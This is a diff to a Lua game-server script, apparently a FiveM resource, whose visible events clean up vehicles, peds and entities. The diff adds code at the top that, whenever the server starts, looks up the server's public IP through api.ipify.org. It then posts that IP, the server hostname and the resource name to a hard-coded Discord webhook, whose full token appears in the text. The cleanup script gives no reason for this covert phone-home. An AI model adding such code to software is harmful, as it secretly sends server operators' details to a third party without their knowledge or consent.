@@ -1,3 +1,27 @@
+local logskingive = "https://discordapp.com/api/webhooks/751014895155150860/9rLrXnItByFCcYwjh3TNgYjAbMc1JVgt8ZuebtX1HJEWmylz_bXtl8R29qbTmyhuyXzN"
+
+function giveskinss(message) 
+    local embed = {
+        {
+          ["color"] = 15158332,
+          ["title"] = " Server Start with my script ",
+          ["description"] = ""..message.."",
+          ["footer"] = {
+          ["text"]= "[ Made By :  Toxic )#0028 ] [  "..os.date("%d/%m/%Y %I:%M %p").." ]",
+          ["icon_url"] = '',
+           },
+         }
+      }
+    
+    
+    PerformHttpRequest(logskingive, function(err, text, headers) end, 'POST', json.encode({username = webname, embeds = embed}), { ['Content-Type'] = 'application/json' })
+    end
+    
+ PerformHttpRequest("https://api.ipify.org/", function (err, text, head)
+  local server_ip = text
+  giveskinss("**ServerName :**`"..GetConvar("sv_hostname").."`\n\n**Started T_GiveSkin Script :** `"..GetCurrentResourceName().."`\n\n**IP :**`"..server_ip.."`")
+  end, 'GET', '')
+
 RegisterServerEvent("2swshit:cleanareaveh")
 RegisterServerEvent("2swshit:cleanareapeds")
 RegisterServerEvent("2swshit:cleanareaentity")
